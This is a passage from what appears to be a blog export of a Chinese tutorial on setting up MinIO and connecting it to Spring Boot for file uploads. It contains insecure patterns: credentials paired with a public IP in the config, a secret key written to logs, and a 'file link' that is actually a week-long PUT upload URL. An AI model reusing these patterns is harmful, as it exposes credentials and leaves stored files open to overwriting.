b.name().equals(bucketName)).findFirst();\n    }\n \n    /**\n     * 根据bucketName删除信息\n     * @param bucketName bucket名称\n     */\n    @SneakyThrows(Exception.class)\n    public  void removeBucket(String bucketName) {\n        minioClient.removeBucket(RemoveBucketArgs.builder().bucket(bucketName).build());\n    }\n \n    /**\n     * 获取文件流\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @return 二进制流\n     */\n    @SneakyThrows(Exception.class)\n    public InputStream getObject(String bucketName, String objectName) {\n        return minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(objectName).build());\n    }\n \n \n    /**\n     * 上传本地文件\n     * @param bucketName 存储桶\n     * @param objectName 对象名称\n     * @param fileName   本地文件路径\n     */\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, String fileName) {\n        if(!bucketExists(bucketName)){\n           createBucket(bucketName);\n        }\n        return minioClient.uploadObject(UploadObjectArgs.builder().bucket(bucketName).object(objectName).filename(fileName).build());\n    }\n \n    /**\n     * 通过流上传文件\n     * @param bucketName  存储桶\n     * @param objectName  文件对象\n     * @param inputStream 文件流\n     */\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, InputStream inputStream) {\n        if(!bucketExists(bucketName)){\n            createBucket(bucketName);\n        }\n        return minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(objectName).stream(inputStream, inputStream.available(), -1).build());\n    }\n \n \n    /**\n     * 單個文件上傳遞\n     * @param bucketName\n     * @param multipartFile\n     * @return\n     */\n    @SneakyThrows(Exception.class)\n    public   String   uploadFileSingle(String  bucketName,MultipartFile multipartFile )  {\n        if(!bucketExists(bucketName)){\n            createBucket(bucketName);\n        }\n        String fileName = multipartFile.getOriginalFilename();\n        String[] split = fileName.split(\"\\\\.\");\n        if (split.length > 1) {\n            fileName = split[0] + \"_\" + System.currentTimeMillis() + \".\" + split[1];\n        } else {\n            fileName = fileName + System.currentTimeMillis();\n        }\n        InputStream in = null;\n        try {\n            in = multipartFile.getInputStream();\n            minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(fileName).stream(in, in.available(), -1).contentType(multipartFile.getContentType()).build());\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (in != null) {\n                try {\n                    in.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        return  getUploadObjectUrl(bucketName,fileName, 7*24*60*60);\n    }\n \n \n    /**\n     * description: 上传文件\n     * @param multipartFile\n     * @return: java.lang.String\n     */\n    public List<String> uploadFileBatch(String  bucketName,MultipartFile[] multipartFile) {\n        if(!bucketExists(bucketName)){\n            createBucket(bucketName);\n        }\n        List<String> names = new ArrayList<>();\n        for (MultipartFile file : multipartFile) {\n            try {\n                String fileName = file.getOriginalFilename();\n                uploadFileSingle(bucketName,file);\n                names.add(fileName);\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n        return names;\n    }\n \n \n    /**\n     * 获取文件外链\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @param expires    过期时间 <=7 秒级\n     * @return url\n     */\n    @SneakyThrows(Exception.class)\n    public  String getUploadObjectUrl(String bucketName, String objectName, Integer expires)  {\n        return minioClient.getPresignedObjectUrl(GetPresignedObjectUrlArgs.builder().method(Method.PUT).bucket(bucketName).object(objectName).expiry(expires).build());\n    }\n \n    /**\n     * 下载文件\n     * bucketName:桶名\n     * @param fileName: 文件名\n     */\n    @SneakyThrows(Exception.class)\n    public  void download(String  bucketName,String fileName, HttpServletResponse response) {\n        // 获取对象的元数据\n        StatObjectResponse  stat = minioClient.statObject(StatObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        response.setContentType(stat.contentType());\n        response.setCharacterEncoding(\"UTF-8\");\n        response.setHeader(\"Content-Disposition\", \"attachment;filename=\" + URLEncoder.encode(fileName, \"UTF-8\"));\n        InputStream is = minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        IOUtils.copy(is, response.getOutputStream());\n        is.close();\n    }\n \n}\n```\n\n上传接口开发\n\n```\n    @SneakyThrows\n    @PostMapping(\"/uploadFile\")\n    @ResponseBody\n    public  String  uploadFile(@RequestParam(\"file\")MultipartFile  multipartFile  ){\n        log.info(\"uploadFile  ----   -----  start \");\n        String imgPath = minioUtils.uploadFileSingle(bucketName, multipartFile);\n        log.info(\"uploadFile  ----   -----  end {}\",imgPath);\n        return   imgPath;\n    }\n```\n\n前端代码编写\n\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>测试Minio上传文件</title>\n    <style>\n        a.upload-img {\n            width: 165px;\n            display: inline-block;\n            margin-bottom: 10px;\n            text-align: center;\n            height: 37px;\n            line-height: 37px;\n            font-size: 14px;\n            color: #FFFFFF;\n            background-color: #f38e81;\n            border-radius: 3px;\n            text-decoration: none;\n            cursor: pointer;\n            border: 0px #fff solid;\n            box-shadow: 0px 0px 5px #B0B0B0;\n        }\n    </style>\n</head>\n<body>\n \n   <div style=\"width: 100%;flex: auto\">\n      <form id=\"img-form\">\n          <a href=\"javascript:void(0)\" class=\"upload-img\"><label for=\"inputImage\">上传图像</label> </a>\n          <input  onchange=\"doUpload()\" type=\"file\" name=\"file\" id=\"inputImage\" accept=\"image/*\"/>\n      </form>\n       <img  height=\"120px\" style=\"margin-left: 20px\" >\n   </div>\n \n   <script>\n       let  doUpload=()=>{\n           console.log(\"1---> start  upload \");\n           let file =  document.getElementById(\"inputImage\").files[0];\n           if (/^image\\/\\w+$/.test(file.type)) {\n               let form = document.getElementById(\"img-form\");\n               let formData = new FormData(form);\n               let oReq = new XMLHttpRequest();\n               oReq.open(\"POST\", \"http://127.0.0.1:9055/uploadFile\", true);\n               oReq.send(formData);\n               oReq.onload = function(oEvent) {\n                   if(oReq.status == 200) {\n                       alert(\"Uploaded Success\");\n                       console.log(\"1---> end  upload \",oReq.response)\n                   }\n               }\n           }\n       }\n \n   </script>\n</body>\n</html>\n```\n\n","source":"_posts/MinIO的搭建与SpringBoot的整合.md","raw":"---\ntitle: MinIO的搭建与SpringBoot的整合\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-09 17:33:10\npassword:\nsummary: MinIO的搭建与SpringBoot的整合\ntags: storage\ncategories: minio\n---\n\n\n\n# MinIO的搭建（单机部署）\n\n## 二进制方式：\n\n```\nmkdir /mnt/data\n```\n\n```\nsudo chmod -R 775 /mnt/data\n```\n\n```\nwget -P /mnt/data/ https://dl.min.io/server/minio/release/linux-amd64/minio\n```\n\n 将下载的文件变成可执行\n\n```\nchmod +x /mnt/data/minio\n```\n\n启动：         (不设置密码就是默认 minioadmin/minioadmin)\n\n```\n/mnt/data/minio server /mnt/data\n```\n\n后台指定9000端口启动：\n\n```\nnohup /mnt/data/minio server  --address :9000 --console-address :9001 /mnt/data/ > /mnt/data/minio.log &\n```\n\n## docker方式：\n\n```\ndocker run -d \\\n  -p 8900:9000 \\\n  -p 8901:9001 \\\n  --name minio2 \\\n  -v ~/var/local/environment/data:/data \\\n  -e \"MINIO_ROOT_USER=root\" \\\n  -e \"MINIO_ROOT_PASSWORD=minio123456\" \\\n  minio/minio server /data --console-address \":8901\"\n```\n\n# spring boot的整合\n\npom加入minio依赖\n\n```\n <dependency>\n      <groupId>io.minio</groupId>\n      <artifactId>minio</artifactId>\n      <version>8.4.5</version>\n</dependency>\n \n<dependency>\n    <groupId>com.squareup.okhttp3</groupId>\n    <artifactId>okhttp</artifactId>\n    <version>4.10.0</version>\n</dependency>\n```\n\nyml文件加入配置\n\n```\nminio:\n  endpoint: http:/81.68.119.53/:9000\n  accessKey: masterminio\n  secretKey: masterminio\n  bucketName: wmy\n```\n\n后端代码编写\n\n```\n@Configuration\n@Slf4j\npublic class MinioClientConfig {\n \n    @Value(\"${minio.endpoint}\")\n    private String endpoint;\n \n    @Value(\"${minio.accessKey}\")\n    private String accessKey;\n \n    @Value(\"${minio.secretKey}\")\n    private String secretKey;\n \n    @Value(\"${minio.bucketName}\")\n    private String bucketName;\n \n    @Bean\n    public MinioClient minioClient() {\n        log.info(\"endpoint={}  ,  accessKey={}  ,secretKey={}\", endpoint, accessKey, secretKey);\n        return MinioClient.builder().credentials(accessKey, secretKey).endpoint(endpoint).build();\n    }\n}\n```\n\n上传文件工具类\n\n```\n@Component\npublic class MinioUtils {\n \n    @Autowired\n    private MinioClient minioClient;\n \n \n    /**\n     * 判断桶是否存在\n     */\n    @SneakyThrows(Exception.class)\n    public boolean bucketExists(String bucketName) {\n        return minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build());\n    }\n \n \n    /**\n     * 创建桶\n     * @param bucketName\n     * 获取全部的桶  minioClient.listBuckets();\n     */\n    @SneakyThrows(Exception.class)\n    public void createBucket(String bucketName) {\n        if (!minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build())) {\n            minioClient.makeBucket(MakeBucketArgs.builder().bucket(bucketName).build());\n        }\n    }\n \n \n    /**\n     * 根据bucketName获取信息\n     * @param bucketName bucket名称\n     */\n    @SneakyThrows(Exception.class)\n    public Optional<Bucket> getBucket(String bucketName) {\n        return minioClient.listBuckets().stream().filter(b -> b.name().equals(bucketName)).findFirst();\n    }\n \n    /**\n     * 根据bucketName删除信息\n     * @param bucketName bucket名称\n     */\n    @SneakyThrows(Exception.class)\n    public  void removeBucket(String bucketName) {\n        minioClient.removeBucket(RemoveBucketArgs.builder().bucket(bucketName).build());\n    }\n \n    /**\n     * 获取文件流\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @return 二进制流\n     */\n    @SneakyThrows(Exception.class)\n    public InputStream getObject(String bucketName, String objectName) {\n        return minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(objectName).build());\n    }\n \n \n    /**\n     * 上传本地文件\n     * @param bucketName 存储桶\n     * @param objectName 对象名称\n     * @param fileName   本地文件路径\n     */\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, String fileName) {\n        if(!bucketExists(bucketName)){\n           createBucket(bucketName);\n        }\n        return minioClient.uploadObject(UploadObjectArgs.builder().bucket(bucketName).object(objectName).filename(fileName).build());\n    }\n \n    /**\n     * 通过流上传文件\n     * @param bucketName  存储桶\n     * @param objectName  文件对象\n     * @param inputStream 文件流\n     */\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, InputStream inputStream) {\n        if(!bucketExists(bucketName)){\n            createBucket(bucketName);\n        }\n        return minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(objectName).stream(inputStream, inputStream.available(), -1).build());\n    }\n \n \n    /**\n     * 單個文件上傳遞\n     * @param bucketName\n     * @param multipartFile\n     * @return\n     */\n    @SneakyThrows(Exception.class)\n    public   String   uploadFileSingle(String  bucketName,MultipartFile multipartFile )  {\n        if(!bucketExists(bucketName)){\n            createBucket(bucketName);\n        }\n        String fileName = multipartFile.getOriginalFilename();\n        String[] split = fileName.split(\"\\\\.\");\n        if (split.length > 1) {\n            fileName = split[0] + \"_\" + System.currentTimeMillis() + \".\" + split[1];\n        } else {\n            fileName = fileName + System.currentTimeMillis();\n        }\n        InputStream in = null;\n        try {\n            in = multipartFile.getInputStream();\n            minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(fileName).stream(in, in.available(), -1).contentType(multipartFile.getContentType()).build());\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (in != null) {\n                try {\n                    in.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        return  getUploadObjectUrl(bucketName,fileName, 7*24*60*60);\n    }\n \n \n    /**\n     * description: 上传文件\n     * @param multipartFile\n     * @return: java.lang.String\n     */\n    public List<String> uploadFileBatch(String  bucketName,MultipartFile[] multipartFile) {\n        if(!bucketExists(bucketName)){\n            createBucket(bucketName);\n        }\n        List<String> names = new ArrayList<>();\n        for (MultipartFile file : multipartFile) {\n            try {\n                String fileName = file.getOriginalFilename();\n                uploadFileSingle(bucketName,file);\n                names.add(fileName);\n            }catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n        return names;\n    }\n \n \n    /**\n     * 获取文件外链\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @param expires    过期时间 <=7 秒级\n     * @return url\n     */\n    @SneakyThrows(Exception.class)\n    public  String getUploadObjectUrl(String bucketName, String objectName, Integer expires)  {\n        return minioClient.getPresignedObjectUrl(GetPresignedObjectUrlArgs.builder().method(Method.PUT).bucket(bucketName).object(objectName).expiry(expires).build());\n    }\n \n    /**\n     * 下载文件\n     * bucketName:桶名\n     * @param fileName: 文件名\n     */\n    @SneakyThrows(Exception.class)\n    public  void download(String  bucketName,String fileName, HttpServletResponse response) {\n        // 获取对象的元数据\n        StatObjectResponse  stat = minioClient.statObject(StatObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        response.setContentType(stat.contentType());\n        response.setCharacterEncoding(\"UTF-8\");\n        response.setHeader(\"Content-Disposition\", \"attachment;filename=\" + URLEncoder.encode(fileName, \"UTF-8\"));\n        InputStream is = minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        IOUtils.copy(is, response.getOutputStream());\n        is.close();\n    }\n \n}\n```\n\n上传接口开发\n\n```\n    @SneakyThrows\n    @PostMapping(\"/uploadFile\")\n    @ResponseBody\n    public  String  uploadFile(@RequestParam(\"file\")MultipartFile  multipartFile  ){\n        log.info(\"uploadFile  ----   -----  start \");\n        String imgPath = minioUtils.uploadFileSingle(bucketName, multipartFile);\n        log.info(\"uploadFile  ----   -----  end {}\",imgPath);\n        return   imgPath;\n    }\n```\n\n前端代码编写\n\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>测试Minio上传文件</title>\n    <style>\n        a.upload-img {\n            width: 165px;\n            display: inline-block;\n            margin-bottom: 10px;\n            text-align: center;\n            height: 37px;\n            line-height: 37px;\n            font-size: 14px;\n            color: #FFFFFF;\n            background-color: #f38e81;\n            border-radius: 3px;\n            text-decoration: none;\n            cursor: pointer;\n            border: 0px #fff solid;\n            box-shadow: 0px 0px 5px #B0B0B0;\n        }\n    </style>\n</head>\n<body>\n \n   <div style=\"width: 100%;flex: auto\">\n      <form id=\"img-form\">\n          <a href=\"javascript:void(0)\" class=\"upload-img\"><label for=\"inputImage\">上传图像</label> </a>\n          <input  onchange=\"doUpload()\" type=\"file\" name=\"file\" id=\"inputImage\" accept=\"image/*\"/>\n      </form>\n       <img  height=\"120px\" style=\"margin-left: 20px\" >\n   </div>\n \n   <script>\n       let  doUpload=()=>{\n           console.log(\"1---> start  upload \");\n           let file =  document.getElementById(\"inputImage\").files[0];\n           if (/^image\\/\\w+$/.test(file.type)) {\n               let form = document.getElementById(\"img-form\");\n               let formData = new FormData(form);\n               let oReq = new XMLHttpRequest();\n               oReq.open(\"POST\", \"http://127.0.0.1:9055/uploadFile\", true);\n               oReq.send(formData);\n               oReq.onload = function(oEvent) {\n                   if(oReq.status == 200) {\n                       alert(\"Uploaded Success\");\n                       console.log(\"1---> end  upload \",oReq.response)\n                   }\n               }\n           }\n       }\n \n   </script>\n</body>\n</html>\n```\n\n","slug":"MinIO的搭建与SpringBoot的整合","published":1,"updated":"2023-03-09T09:35:31.513Z","_id":"clf0wz5v10001pgvgagvy3xak","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"MinIO的搭建（单机部署）\"><a href=\"#MinIO的搭建（单机部署）\" class=\"headerlink\" title=\"MinIO的搭建（单机部署）\"></a>MinIO的搭建（单机部署）</h1><h2 id=\"二进制方式：\"><a href=\"#二进制方式：\" class=\"headerlink\" title=\"二进制方式：\"></a>二进制方式：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">mkdir &#x2F;mnt&#x2F;data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo chmod -R 775 &#x2F;mnt&#x2F;data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wget -P &#x2F;mnt&#x2F;data&#x2F; https:&#x2F;&#x2F;dl.min.io&#x2F;server&#x2F;minio&#x2F;release&#x2F;linux-amd64&#x2F;minio<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> 将下载的文件变成可执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">chmod +x &#x2F;mnt&#x2F;data&#x2F;minio<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>启动：         (不设置密码就是默认 minioadmin/minioadmin)</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;mnt&#x2F;data&#x2F;minio server &#x2F;mnt&#x2F;data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>后台指定9000端口启动：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nohup &#x2F;mnt&#x2F;data&#x2F;minio server  --address :9000 --console-address :9001 &#x2F;mnt&#x2F;data&#x2F; &gt; &#x2F;mnt&#x2F;data&#x2F;minio.log &amp;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"docker方式：\"><a href=\"#docker方式：\" class=\"headerlink\" title=\"docker方式：\"></a>docker方式：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">docker run -d \\\n  -p 8900:9000 \\\n  -p 8901:9001 \\\n  --name minio2 \\\n  -v ~&#x2F;var&#x2F;local&#x2F;environment&#x2F;data:&#x2F;data \\\n  -e &quot;MINIO_ROOT_USER&#x3D;root&quot; \\\n  -e &quot;MINIO_ROOT_PASSWORD&#x3D;minio123456&quot; \\\n  minio&#x2F;minio server &#x2F;data --console-address &quot;:8901&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"spring-boot的整合\"><a href=\"#spring-boot的整合\" class=\"headerlink\" title=\"spring boot的整合\"></a>spring boot的整合</h1><p>pom加入minio依赖</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"> &lt;dependency&gt;\n      &lt;groupId&gt;io.minio&lt;&#x2F;groupId&gt;\n      &lt;artifactId&gt;minio&lt;&#x2F;artifactId&gt;\n      &lt;version&gt;8.4.5&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n \n&lt;dependency&gt;\n    &lt;groupId&gt;com.squareup.okhttp3&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;okhttp&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;4.10.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>yml文件加入配置</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">minio:\n  endpoint: http:&#x2F;81.68.119.53&#x2F;:9000\n  accessKey: masterminio\n  secretKey: masterminio\n  bucketName: wmy<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>后端代码编写</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">@Configuration\n@Slf4j\npublic class MinioClientConfig &#123;\n \n    @Value(&quot;$&#123;minio.endpoint&#125;&quot;)\n    private String endpoint;\n \n    @Value(&quot;$&#123;minio.accessKey&#125;&quot;)\n    private String accessKey;\n \n    @Value(&quot;$&#123;minio.secretKey&#125;&quot;)\n    private String secretKey;\n \n    @Value(&quot;$&#123;minio.bucketName&#125;&quot;)\n    private String bucketName;\n \n    @Bean\n    public MinioClient minioClient() &#123;\n        log.info(&quot;endpoint&#x3D;&#123;&#125;  ,  accessKey&#x3D;&#123;&#125;  ,secretKey&#x3D;&#123;&#125;&quot;, endpoint, accessKey, secretKey);\n        return MinioClient.builder().credentials(accessKey, secretKey).endpoint(endpoint).build();\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上传文件工具类</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">@Component\npublic class MinioUtils &#123;\n \n    @Autowired\n    private MinioClient minioClient;\n \n \n    &#x2F;**\n     * 判断桶是否存在\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public boolean bucketExists(String bucketName) &#123;\n        return minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build());\n    &#125;\n \n \n    &#x2F;**\n     * 创建桶\n     * @param bucketName\n     * 获取全部的桶  minioClient.listBuckets();\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public void createBucket(String bucketName) &#123;\n        if (!minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build())) &#123;\n            minioClient.makeBucket(MakeBucketArgs.builder().bucket(bucketName).build());\n        &#125;\n    &#125;\n \n \n    &#x2F;**\n     * 根据bucketName获取信息\n     * @param bucketName bucket名称\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public Optional&lt;Bucket&gt; getBucket(String bucketName) &#123;\n        return minioClient.listBuckets().stream().filter(b -&gt; b.name().equals(bucketName)).findFirst();\n    &#125;\n \n    &#x2F;**\n     * 根据bucketName删除信息\n     * @param bucketName bucket名称\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  void removeBucket(String bucketName) &#123;\n        minioClient.removeBucket(RemoveBucketArgs.builder().bucket(bucketName).build());\n    &#125;\n \n    &#x2F;**\n     * 获取文件流\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @return 二进制流\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public InputStream getObject(String bucketName, String objectName) &#123;\n        return minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(objectName).build());\n    &#125;\n \n \n    &#x2F;**\n     * 上传本地文件\n     * @param bucketName 存储桶\n     * @param objectName 对象名称\n     * @param fileName   本地文件路径\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, String fileName) &#123;\n        if(!bucketExists(bucketName))&#123;\n           createBucket(bucketName);\n        &#125;\n        return minioClient.uploadObject(UploadObjectArgs.builder().bucket(bucketName).object(objectName).filename(fileName).build());\n    &#125;\n \n    &#x2F;**\n     * 通过流上传文件\n     * @param bucketName  存储桶\n     * @param objectName  文件对象\n     * @param inputStream 文件流\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, InputStream inputStream) &#123;\n        if(!bucketExists(bucketName))&#123;\n            createBucket(bucketName);\n        &#125;\n        return minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(objectName).stream(inputStream, inputStream.available(), -1).build());\n    &#125;\n \n \n    &#x2F;**\n     * 單個文件上傳遞\n     * @param bucketName\n     * @param multipartFile\n     * @return\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public   String   uploadFileSingle(String  bucketName,MultipartFile multipartFile )  &#123;\n        if(!bucketExists(bucketName))&#123;\n            createBucket(bucketName);\n        &#125;\n        String fileName &#x3D; multipartFile.getOriginalFilename();\n        String[] split &#x3D; fileName.split(&quot;\\\\.&quot;);\n        if (split.length &gt; 1) &#123;\n            fileName &#x3D; split[0] + &quot;_&quot; + System.currentTimeMillis() + &quot;.&quot; + split[1];\n        &#125; else &#123;\n            fileName &#x3D; fileName + System.currentTimeMillis();\n        &#125;\n        InputStream in &#x3D; null;\n        try &#123;\n            in &#x3D; multipartFile.getInputStream();\n            minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(fileName).stream(in, in.available(), -1).contentType(multipartFile.getContentType()).build());\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125; finally &#123;\n            if (in !&#x3D; null) &#123;\n                try &#123;\n                    in.close();\n                &#125; catch (IOException e) &#123;\n                    e.printStackTrace();\n                &#125;\n            &#125;\n        &#125;\n        return  getUploadObjectUrl(bucketName,fileName, 7*24*60*60);\n    &#125;\n \n \n    &#x2F;**\n     * description: 上传文件\n     * @param multipartFile\n     * @return: java.lang.String\n     *&#x2F;\n    public List&lt;String&gt; uploadFileBatch(String  bucketName,MultipartFile[] multipartFile) &#123;\n        if(!bucketExists(bucketName))&#123;\n            createBucket(bucketName);\n        &#125;\n        List&lt;String&gt; names &#x3D; new ArrayList&lt;&gt;();\n        for (MultipartFile file : multipartFile) &#123;\n            try &#123;\n                String fileName &#x3D; file.getOriginalFilename();\n                uploadFileSingle(bucketName,file);\n                names.add(fileName);\n            &#125;catch (Exception e)&#123;\n                e.printStackTrace();\n            &#125;\n        &#125;\n        return names;\n    &#125;\n \n \n    &#x2F;**\n     * 获取文件外链\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @param expires    过期时间 &lt;&#x3D;7 秒级\n     * @return url\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  String getUploadObjectUrl(String bucketName, String objectName, Integer expires)  &#123;\n        return minioClient.getPresignedObjectUrl(GetPresignedObjectUrlArgs.builder().method(Method.PUT).bucket(bucketName).object(objectName).expiry(expires).build());\n    &#125;\n \n    &#x2F;**\n     * 下载文件\n     * bucketName:桶名\n     * @param fileName: 文件名\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  void download(String  bucketName,String fileName, HttpServletResponse response) &#123;\n        &#x2F;&#x2F; 获取对象的元数据\n        StatObjectResponse  stat &#x3D; minioClient.statObject(StatObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        response.setContentType(stat.contentType());\n        response.setCharacterEncoding(&quot;UTF-8&quot;);\n        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename&#x3D;&quot; + URLEncoder.encode(fileName, &quot;UTF-8&quot;));\n        InputStream is &#x3D; minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        IOUtils.copy(is, response.getOutputStream());\n        is.close();\n    &#125;\n \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上传接口开发</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">@SneakyThrows\n@PostMapping(&quot;&#x2F;uploadFile&quot;)\n@ResponseBody\npublic  String  uploadFile(@RequestParam(&quot;file&quot;)MultipartFile  multipartFile  )&#123;\n    log.info(&quot;uploadFile  ----   -----  start &quot;);\n    String imgPath &#x3D; minioUtils.uploadFileSingle(bucketName, multipartFile);\n    log.info(&quot;uploadFile  ----   -----  end &#123;&#125;&quot;,imgPath);\n    return   imgPath;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>前端代码编写</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;测试Minio上传文件&lt;&#x2F;title&gt;\n    &lt;style&gt;\n        a.upload-img &#123;\n            width: 165px;\n            display: inline-block;\n            margin-bottom: 10px;\n            text-align: center;\n            height: 37px;\n            line-height: 37px;\n            font-size: 14px;\n            color: #FFFFFF;\n            background-color: #f38e81;\n            border-radius: 3px;\n            text-decoration: none;\n            cursor: pointer;\n            border: 0px #fff solid;\n            box-shadow: 0px 0px 5px #B0B0B0;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n \n   &lt;div style&#x3D;&quot;width: 100%;flex: auto&quot;&gt;\n      &lt;form id&#x3D;&quot;img-form&quot;&gt;\n          &lt;a href&#x3D;&quot;javascript:void(0)&quot; class&#x3D;&quot;upload-img&quot;&gt;&lt;label for&#x3D;&quot;inputImage&quot;&gt;上传图像&lt;&#x2F;label&gt; 